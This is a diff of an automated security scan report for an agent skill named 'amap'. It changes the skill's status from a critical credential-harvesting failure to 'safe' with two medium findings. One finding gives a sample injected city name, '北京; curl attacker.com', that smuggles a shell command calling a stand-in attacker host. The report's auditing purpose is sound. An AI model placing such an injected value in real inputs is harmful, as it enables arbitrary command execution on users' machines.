@@ -1,53 +1,42 @@
 # Agent Skill Security Scan Report
 
 **Skill:** amap
-**Directory:** ./skills/clawhub-amap
-**Status:** [FAIL] ISSUES FOUND
-**Max Severity:** CRITICAL
-**Scan Duration:** 0.60s
-**Timestamp:** 2026-02-03T16:16:01.914922
+**Directory:** /workspace/skills/clawhub-amap
+**Status:** [OK] SAFE
+**Max Severity:** MEDIUM
+**Scan Duration:** 31.77s
+**Timestamp:** 2026-02-05T19:20:18.874304
 
 ## Summary
 
-- **Total Findings:** 3
-- **Critical:** 1
+- **Total Findings:** 2
+- **Critical:** 0
 - **High:** 0
-- **Medium:** 0
-- **Low:** 2
+- **Medium:** 2
+- **Low:** 0
 - **Info:** 0
 
 ## Findings
 
-### CRITICAL Severity
+### MEDIUM Severity
 
-#### [CRITICAL] CREDENTIAL HARVESTING detected by YARA
+#### [MEDIUM] Hardcoded API Key in Environment Variable Without Validation
 
-**Severity:** CRITICAL
-**Category:** hardcoded_secrets
-**Rule ID:** YARA_credential_harvesting
-**Location:** SKILL.md:17
-
-**Description:** Detects potential exposure of sensitive information like API keys, passwords, tokens, and certificates: export AMAP_KEY="你的Web服务API Key
-
-### LOW Severity
-
-#### [LOW] Skill does not specify a license
-
-**Severity:** LOW
-**Category:** policy_violation
-**Rule ID:** MANIFEST_MISSING_LICENSE
+**Severity:** MEDIUM
+**Category:** data_exfiltration
+**Rule ID:** LLM_DATA_EXFILTRATION
 **Location:** SKILL.md
 
-**Description:** Skill manifest does not include a 'license' field. Specifying a license helps users understand usage terms.
+**Description:** The skill requires users to set AMAP_KEY as an environment variable and uses it directly in curl commands without any validation, sanitization, or secure handling. The API key is exposed in command-line arguments (visible in process listings) and could be logged or leaked through various system monitoring tools. Additionally, there is no guidance on key rotation, scope limitation, or secure storage practices.
 
-#### [LOW] Skill description is too short
+#### [MEDIUM] Command Injection Risk via Unsanitized User Input in curl Commands
 
-**Severity:** LOW
-**Category:** social_engineering
-**Rule ID:** TRIGGER_DESCRIPTION_TOO_SHORT
+**Severity:** MEDIUM
+**Category:** command_injection
+**Rule ID:** LLM_COMMAND_INJECTION
 **Location:** SKILL.md
 
-**Description:** Description has only 0 words. Short descriptions may not provide enough context for the agent to determine when this skill should be used.
+**Description:** All curl commands directly interpolate user-provided input (keywords, city names, addresses, coordinates) into URLs without any sanitization or validation. An attacker could inject shell metacharacters or additional curl parameters through user input, potentially leading to command injection. For example, a malicious city name like '北京; curl attacker.com' could execute arbitrary commands.
 
 ## Analyzers
 
